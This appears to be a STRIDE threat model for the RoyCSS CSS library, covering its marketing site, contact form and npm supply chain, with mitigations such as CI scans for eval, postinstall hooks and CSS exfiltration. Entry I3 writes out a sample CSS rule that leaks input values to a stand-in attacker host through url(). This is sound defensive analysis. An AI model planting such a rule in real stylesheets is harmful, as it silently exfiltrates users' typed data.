# Threat Model — RoyCSS Security Audit (STRIDE)

- **Document owner:** Security Engineering & Supply Chain domain agent
- **Scope:** All code shipped under `/home/z/my-project/` — the `roycss` npm
  package, the Next.js marketing site, the VS Code extension, the Chrome
  Inspector, the CLI, and the MCP server. This model focuses on the
  marketing site + contact form + supply chain.
- **Methodology:** STRIDE (Spoofing / Tampering / Repudiation / Information
  disclosure / Denial of service / Elevation of privilege)
- **Related:** `docs/threat-models/07-security-supply-chain.md` (pre-existing
  model — broader, includes CSS-specific vectors), `docs/adr/security/DESIGN.md`,
  `docs/adr/security/ADR.md`, `security/CONTACT-FORM-SECURITY.md`
- **Status:** Approved
- **Last reviewed:** 2026-07-30

---

## 1. Summary

This model uses the STRIDE categories as requested by the task brief. Each
threat includes likelihood (Low / Medium / High), impact (Low / Medium /
High / Critical), and current mitigation. Threats with no mitigation are
flagged as **gaps** and tracked in `IMPLEMENTATION-PLAN.md`.

| STRIDE | Threats in scope | Notes |
|---|---|---|
| **S**poofing | S1–S3 | N/A for end-user auth (no auth exists); applies to npm package impersonation, CSP nonce reuse, build identity |
| **T**ampering | T1–T4 | Contact form data integrity, effect CSS injection, dependency tampering, lockfile tampering |
| **R**epudiation | R1–R2 | Contact form logging, publish attribution |
| **I**nformation Disclosure | I1–I6 | Prisma DB exposure, env vars, CSS exfiltration, XSS, Referer leak, log leakage |
| **D**enial of Service | D1–D4 | Form spam, large effect searches, `bun audit` blocking release, CSP report flood |
| **E**levation of Privilege | E1–E2 | N/A for end-user auth; applies to build-time privilege escalation, supply-chain privilege |

---

## 2. Spoofing

> **N/A for end-user authentication.** The marketing site has no logins,
> no sessions, no cookies. This section covers non-auth spoofing vectors.

### S1 — Malicious npm package impersonates a RoyCSS dependency

- **Scenario:** An attacker typosquats `react-snytax-highlighter` or
  `framer-moton` and a developer accidentally installs it via `bun add`.
- **Likelihood:** Low
- **Impact:** Critical (a malicious dep with `postinstall` can patch any
  file in `node_modules/`, including `dist/roycss.min.css`)
- **Current mitigation:**
  - `bun install` resolves only names in `package.json` — typos must be
    committed by a maintainer.
  - The release checklist requires `bun audit` + a `package.json` diff
    review before every release.
  - The SBOM (`security/SBOM.json` and `security/results/sbom.json`) lists
    every dep's purl for cross-checking.
  - `security/audit.ts` scans every dep's `package.json` for `postinstall`,
    `preinstall`, `install`, `prepare` scripts and reports them.
- **Gap:** None.

### S2 — Attacker publishes a fake `roycss` package on npm

- **Scenario:** A compromised maintainer account pushes a backdoored
  tarball directly to npm (bypassing CI).
- **Likelihood:** Low
- **Impact:** Critical (every consumer who runs `npm install roycss` gets
  the backdoored version)
- **Current mitigation:**
  - `publish:ci` script uses `npm publish --provenance --access public`
    (Sigstore signature linking tarball to GitHub Actions run).
  - `scripts/publish/release.ts` calls `publish:ci` (not `publish` directly).
  - Consumers can verify with `npm audit signatures`.
  - 2FA is required on the maintainer npm account (out-of-band policy).
- **Gap:** None. (See ADR-S4 in `ADR.md`.)

### S3 — CSP nonce reuse across requests

- **Scenario:** A bug in `src/middleware.ts` generates the same nonce for
  two requests, letting an attacker who captures one nonce reuse it on
  another request.
- **Likelihood:** Low
- **Impact:** Medium (enables one XSS within the request's lifetime)
- **Current mitigation:**
  - `src/middleware.ts` generates the nonce with
    `crypto.getRandomValues(new Uint8Array(16))` per request — 128 bits of
    entropy.
  - The nonce lives only in the response header + rendered `<script>` tags.
  - The nonce is never persisted, never logged, never sent to a third party.
- **Gap:** None.

---

## 3. Tampering

### T1 — Contact form data is tampered in transit

- **Scenario:** A MITM intercepts the POST `/api/contact` request and
  modifies the body (e.g. changes the email to attacker's email).
- **Likelihood:** Low (HTTPS enforced via HSTS preload)
- **Impact:** Medium (PII is redirected to attacker)
- **Current mitigation:**
  - HSTS (`Strict-Transport-Security: max-age=63072000; includeSubDomains;
    preload`) forces HTTPS.
  - `upgrade-insecure-requests` in CSP forces HTTPS on subresources.
  - Caddy terminates TLS with a valid cert (see `Caddyfile`).
- **Gap:** None.

### T2 — Contact form data is tampered client-side (e.g. subject field)

- **Scenario:** A user opens DevTools and changes the `subject` from the
  enum-constrained dropdown to an arbitrary string before submit.
- **Likelihood:** Medium (trivial for a technical user)
- **Impact:** Low (the server accepts any string ≤160 chars; the worst
  case is an off-topic subject line in the DB)
- **Current mitigation:**
  - Server-side `.slice(0, 160)` truncates the subject.
  - The server does not validate the subject against the enum (the client
    sends `SUBJECTS.find(...)?.label ?? "General Inquiry"`).
- **Gap:** Minor — the server should validate the subject against the
  enum. Tracked as **R-4** in IMPLEMENTATION-PLAN.md (low priority; the
  worst case is cosmetic).

### T3 — Effect CSS injection via `dangerouslySetInnerHTML`

- **Scenario:** A future PR routes user input (search query, contact form
  field, URL param) through `dangerouslySetInnerHTML`.
- **Likelihood:** Medium (the pattern exists in 3 places today; a future
  change could add a 4th)
- **Impact:** Critical (full XSS, form data exfiltration, defacement)
- **Current mitigation:**
  - `security/xss-scan.ts` fails the build if any
    `dangerouslySetInnerHTML` lacks a `// SECURITY:` comment naming the
    threat model entry that justifies it.
  - The 3 current uses inject library CSS only (see `DESIGN.md` §4.3).
  - The docs overlay uses `react-markdown` without `rehype-raw`, so raw
    HTML in markdown cannot render.
- **Gap:** None. (CI gate enforces.)

### T4 — Dependency tampering via `postinstall` script

- **Scenario:** A new direct runtime dep ships a `postinstall` that runs
  arbitrary code (e.g. patches `dist/roycss.min.css` to add an
  exfiltration rule).
- **Likelihood:** Low
- **Impact:** Critical
- **Current mitigation:**
  - `security/audit.ts` scans every dep's `package.json` for `postinstall`,
    `preinstall`, `install`, `prepare` scripts and reports them.
  - The release checklist requires manual review of any new dep with these
    scripts.
  - 8 runtime deps currently have `postinstall` (documented in
    `security/results/audit-report.json`): `@hookform/resolvers`,
    `@prisma/client`, `prisma`, `react-hook-form`, `react-syntax-highlighter`,
    `recharts`, `tailwindcss-animate`, `uuid`. All are well-known packages
    whose `postinstall` does expected things (Prisma downloads the query
    engine, sharp downloads libvips binaries, etc.).
- **Gap:** None. (Reporting is in place; manual review is the policy.)

---

## 4. Repudiation

### R1 — A maintainer denies shipping a vulnerable version

- **Scenario:** A consumer reports a vuln in `roycss@1.4.0`; the maintainer
  claims "we never shipped that version."
- **Likelihood:** Low
- **Impact:** Medium (reputational damage; consumer cannot get a fix)
- **Current mitigation:**
  - Every release is git-tagged (`v1.4.0`, etc.).
  - `CHANGELOG.md` documents the version bump.
  - `package.json` `version` matches the git tag.
  - `npm publish --provenance` attaches a Sigstore signature linking the
    tarball to the GitHub Actions run that built it.
  - `bun.lock` is committed, so the exact dep tree is reproducible.
- **Gap:** None.

### R2 — A user denies submitting the contact form (or a maintainer denies receiving it)

- **Scenario:** A user claims they submitted a contact form message that
  was never answered; the maintainer claims no such message exists.
- **Likelihood:** Low
- **Impact:** Low (no contractual obligation to respond; no PII dispute
  resolution process defined)
- **Current mitigation:**
  - The contact route returns `{ ok: true, message: "Thanks for reaching
    out! Your message has been received." }` on success — the user sees
    this confirmation.
  - The DB row has `createdAt` (timestamp) and `id` (cuid) — the
    maintainer can query `SELECT * FROM ContactMessage WHERE email = ?`
    to verify.
  - **But:** the route does not log the IP, user-agent, or any other
    request metadata. Repudiation is partially mitigated by the DB row's
    existence, but there is no audit trail of *who* submitted it.
- **Gap:** Minor — log a hashed IP + timestamp on submission (not the full
  IP, which is PII). Tracked as **R-5** (low priority).

---

## 5. Information Disclosure

### I1 — Prisma DB exposure (SQLite file read by attacker)

- **Scenario:** An attacker gains filesystem read access to
  `prisma/dev.db` and reads all contact form submissions.
- **Likelihood:** Low (filesystem-only DB, no network listener)
- **Impact:** High (PII leak: names + emails + messages)
- **Current mitigation:**
  - SQLite has no network listener — the attacker must already have
    filesystem access (in which case they likely have broader compromise).
  - The DB file is at `prisma/dev.db` (default location; could be moved
    via `DATABASE_URL`).
  - No DB credentials are needed (SQLite is filesystem-permission-based).
  - The DB is not in the SBOM, not in git, not in the npm tarball.
- **Gap:** None for the current threat model. (If we ever move to Postgres,
  this changes — would need TLS, strong password, network ACL.)

### I2 — Environment variables leaked via error messages or logs

- **Scenario:** An error handler logs `process.env` or includes env var
  values in a 500 response.
- **Likelihood:** Low
- **Impact:** High (if `DATABASE_URL` or `NPM_TOKEN` leaked)
- **Current mitigation:**
  - The contact route's 500 response says "Something went wrong. Please
    try again later." — no stack trace, no env vars.
  - `console.error("[contact] Unexpected error:", err)` logs the error
    object, but the error object does not include env vars (Prisma errors
    include the query, not the env).
  - No `console.log(process.env)` anywhere in the codebase (verified by
    `security/xss-scan.ts` pattern, though it doesn't explicitly check for
    this — future enhancement).
- **Gap:** None for current code. Add a lint rule that flags
  `console.log(process.env)` and `console.log(process.env.*)` — tracked
  as **R-6** (low priority).

### I3 — CSS data exfiltration via attribute selectors + `url()`

- **Scenario:** A RoyCSS effect ships
  `input[value^="a"] { background: url(attacker.com/?leak=a) }`. Every
  consumer page that loads `roycss.min.css` and has an `<input>` starting
  with "a" leaks that character to attacker.com.
- **Likelihood:** Low (would require a malicious PR to land)
- **Impact:** Critical (silent exfiltration on every consumer page)
- **Current mitigation:**
  - `security/css-exfiltration-check.ts` scans every effect's CSS for
    `[value^=…]`, `[value*=…]`, `[type=…]` attribute selectors combined
    with `url()`. Any match fails the build.
  - The OKLCH migration stripped all external color references.
  - The library has zero attribute selectors that combine with `url()`
    (verified by the scan).
- **Gap:** None. (CI gate enforces.)

### I4 — XSS via `eval` / `new Function` / `document.write`

- **Scenario:** A future PR adds `eval(queryString)` to parse a URL param.
- **Likelihood:** Low (no current uses; pattern is well-known to be bad)
- **Impact:** Critical (full XSS)
- **Current mitigation:**
  - `security/xss-scan.ts` fails the build if any `eval(`, `new Function(`,
    `setTimeout(string)`, `setInterval(string)`, or `document.write` is
    found.
  - The current codebase has zero such calls (verified).
- **Gap:** None. (CI gate enforces.)

### I5 — Referer leak to third-party

- **Scenario:** A user clicks an external link (e.g. GitHub) and the full
  URL `roycss.com/?search=secret` is sent in the Referer header.
- **Likelihood:** Low (the site has no external links that include user
  input in the URL)
- **Impact:** Low
- **Current mitigation:**
  - `Referrer-Policy: strict-origin-when-cross-origin` sends only the
    origin (`https://roycss.com`) for cross-origin requests.
  - The site has no external links that include user input in the URL.
- **Gap:** None.

### I6 — PII leak via logs

- **Scenario:** The contact route logs the request body (name, email,
  message) to `dev.log` or `server.log`.
- **Likelihood:** Low (current code does not log the body)
- **Impact:** High (PII in plaintext log files)
- **Current mitigation:**
  - `console.error("[contact] Failed to persist message to DB")` — no PII.
  - `console.error("[contact] Unexpected error:", err)` — the `err` object
    does not include the request body (validation happens before the DB
    call; the body is in scope but not logged).
- **Gap:** None for current code. Add a lint rule that flags
  `console.log(body)`, `console.log(req.body)`, etc. in API routes —
  tracked as **R-6** (low priority).

---

## 6. Denial of Service

### D1 — Contact form spam floods the SQLite DB

- **Scenario:** A bot submits 1,000 messages/minute to `/api/contact`. The
  SQLite file grows until disk fills.
- **Likelihood:** Medium (the form is public, no rate limit exists)
- **Impact:** Medium (disk exhaustion; no service outage but the DB
  becomes unusable)
- **Current mitigation:**
  - Input validation rejects malformed bodies (400 response, no DB write).
  - `.slice(0, 5000)` caps the message length.
  - **No rate limit exists.**
- **Gap:** **HIGH.** Tracked as **R-1** in IMPLEMENTATION-PLAN.md.
  Recommended: IP-based rate limit (5 req/min) in `src/middleware.ts`.

### D2 — Large effect search causes slow render

- **Scenario:** A user searches for a common term (e.g. "a") and the
  VirtualScrollGrid tries to render 1,569 effect cards at once.
- **Likelihood:** Medium
- **Impact:** Low (client-side perf issue, not server DoS)
- **Current mitigation:**
  - `VirtualScrollGrid` renders cards in batches of 24, growing on
    `IntersectionObserver` intersection. The grid never renders all 1,569
    at once.
  - `DynamicEffectCSS` injects CSS only for visible cards via
    `IntersectionObserver`.
- **Gap:** None for current architecture. (See `docs/perf/` for the
  performance domain's deeper analysis.)

### D3 — `bun audit` finds a CVE with no patched version

- **Scenario:** A new CVE drops for a dep that has no fix yet. `bun audit`
  fails. The release is blocked.
- **Likelihood:** Medium (happens a few times a year across 1,088 deps)
- **Impact:** Medium (release is delayed; consumers wait for a fix)
- **Current mitigation:**
  - `security/audit.ts` exits 1 if any high/critical is present.
  - The release is blocked until either (a) a patched version ships,
    (b) we apply an `override` to a forked version, or (c) we document
    a workaround in the threat model and add an entry to the
    `ACCEPTED_ADVISORIES` array in `security/audit.ts`.
  - The `ACCEPTED_ADVISORIES` array is currently empty (no accepted-risk
    advisories as of 2026-07-30).
- **Gap:** None. (Process is defined; the array shape exists for future
  accepted-risk entries.)

### D4 — CSP violation report flood (if `report-to` is added)

- **Scenario:** A bug in the CSP causes every request to log a violation.
  The reporting endpoint receives 1,000 reports/second and goes down.
- **Likelihood:** Low (we don't currently use `report-to`)
- **Impact:** Low (the site continues to work; only the reporting endpoint
  is affected)
- **Current mitigation:**
  - We ship CSP in enforcing mode (not report-only), so violations are
    blocked, not logged.
  - No `report-to` or `report-uri` directive is configured.
- **Gap:** None for current config. If `report-to` is added later, it
  must rate-limit (e.g. 1 report per 60 seconds per browser).

---

## 7. Elevation of Privilege

> **N/A for end-user authentication.** No auth, no roles, no privilege
> ladder to climb. This section covers non-auth privilege escalation.

### E1 — Build-time privilege escalation via compromised CI runner

- **Scenario:** A compromised GitHub Actions runner has `NPM_TOKEN` in env
  and can publish a backdoored tarball.
- **Likelihood:** Low (GitHub Actions runners are isolated; token scope
  is npm publish only)
- **Impact:** Critical (backdoored tarball reaches all consumers)
- **Current mitigation:**
  - `npm publish --provenance` attaches a Sigstore signature linking the
    tarball to the specific GitHub Actions run. Consumers can verify.
  - `NPM_TOKEN` is repo-scoped (not org-scoped), environment-restricted
    to the `release` workflow, and never written to a file.
  - The publish step runs only on git tags (`on: push: tags: ['v*']`).
  - 2FA is required on the maintainer npm account.
- **Gap:** None. (See ADR-S4 in `ADR.md`.)

### E2 — Supply-chain privilege escalation via malicious `override`

- **Scenario:** An attacker PR adds an `override` that forces a vulnerable
  version of a transitive dep (e.g. `"minimatch": "^3.0.0"` to reintroduce
  a ReDoS).
- **Likelihood:** Low (PRs require review; `bun audit` runs as CI gate)
- **Impact:** High (vulnerable dep slips into the build)
- **Current mitigation:**
  - `bun audit` runs as a CI gate; any high/critical advisory fails the
    build.
  - The `overrides` list is documented in `docs/adr/07-security-supply-chain.md`
    §6 with rationale per override.
  - PR review is required for `package.json` changes (branch protection
    rule, out-of-band policy).
- **Gap:** None.

---

## 8. Threats NOT in scope (deferred)

| Threat | Why deferred |
|---|---|
| End-user auth spoofing (session hijack, cookie theft) | No auth exists. |
| End-user auth elevation (privilege escalation) | No auth exists. |
| Payment fraud | No payments. |
| Multi-tenant data leakage | Single-tenant. |
| DDoS volumetric attacks | Handled by Caddy rate-limit + Cloudflare (out-of-band). |
| Browser exploit mitigation (Spectre, Meltdown) | Out of scope; TLS + HSTS + CSP in scope. |
| Insider threat (malicious maintainer with commit access) | Mitigated by PR review + 2FA + Sigstore; not fully solvable. |

---

## 9. Mitigations summary

| Threat | Likelihood | Impact | Mitigation | Gap? |
|---|---|---|---|---|
| S1 typosquat dep | Low | Critical | SBOM + audit + checklist | No |
| S2 fake npm publish | Low | Critical | `--provenance` + 2FA | No |
| S3 nonce reuse | Low | Medium | `crypto.getRandomValues` per request | No |
| T1 form tampering in transit | Low | Medium | HSTS + TLS | No |
| T2 form subject tampering | Medium | Low | Server truncates to 160 chars | Minor (R-4) |
| T3 effect CSS injection | Medium | Critical | `xss-scan.ts` CI gate | No |
| T4 dep tampering via postinstall | Low | Critical | `audit.ts` reports + manual review | No |
| R1 maintainer repudiation | Low | Medium | git tags + Sigstore + CHANGELOG | No |
| R2 user repudiation | Low | Low | DB row + `createdAt` | Minor (R-5) |
| I1 Prisma DB exposure | Low | High | SQLite filesystem-only | No |
| I2 env var leak | Low | High | No env vars in errors/logs | No |
| I3 CSS exfiltration | Low | Critical | `css-exfiltration-check.ts` CI gate | No |
| I4 XSS via eval | Low | Critical | `xss-scan.ts` CI gate | No |
| I5 Referer leak | Low | Low | `Referrer-Policy` header | No |
| I6 PII in logs | Low | High | No body logging | No |
| D1 form spam flood | **Medium** | Medium | Input validation only | **HIGH (R-1)** |
| D2 large effect search | Medium | Low | VirtualScrollGrid batching | No |
| D3 unfixable CVE | Medium | Medium | `ACCEPTED_ADVISORIES` process | No |
| D4 CSP report flood | Low | Low | Enforcing mode, no `report-to` | No |
| E1 CI runner compromise | Low | Critical | Sigstore + scoped token | No |
| E2 malicious override | Low | High | `bun audit` CI gate + review | No |

---

## 10. Residual risk

The single highest-priority residual risk is **D1 (form spam flood)** —
no rate limit exists. This is the only **HIGH** gap. All other gaps are
**Minor** or **None**. See `IMPLEMENTATION-PLAN.md` for the remediation
plan.

---

## 11. References

- `docs/adr/security/DESIGN.md` — security architecture
- `docs/adr/security/ADR.md` — 5 ADRs
- `docs/adr/security/IMPLEMENTATION-PLAN.md` — remediation plan
- `docs/adr/security/REVIEW-CHECKLIST.md` — 20 review items
- `docs/adr/07-security-supply-chain.md` — pre-existing cross-cutting ADR
- `docs/threat-models/07-security-supply-chain.md` — pre-existing STRIDE
  model (broader, includes CSS-specific vectors)
- `security/CONTACT-FORM-SECURITY.md` — contact form audit
- STRIDE: <https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats>
- OWASP Top 10: <https://owasp.org/Top10/>
